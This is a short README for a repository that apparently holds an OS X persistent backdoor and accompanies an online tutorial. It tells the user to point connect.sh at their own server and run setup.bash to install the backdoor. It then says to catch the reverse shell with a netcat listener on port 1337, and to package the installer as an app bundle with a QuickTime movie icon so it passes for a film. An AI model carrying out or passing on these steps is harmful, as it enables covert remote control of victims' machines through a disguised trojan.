OSX-Peristant-BackDoor
======================

These files come with the tutorial: http://patrickmosca.com/osx-persistent-backdoor/

1) Edit 'connect.sh' with your publically visible sever ip address and port.
2) Run 'setup.bash' on modern OS X to install the backdoor.
3) Catch the shell remotely with 'nc -l -p 1337'

A sample Quicktime movie icon and Platypus file is also included. 
These can be used to package the 'setup.bash' script into an OS X app bundle.
The purpose of this package is to show how easy it is to hide a backdoor into a file that 
looks identical to a movie. 

Platypus can be found here: http://sveinbjorn.org/platypus
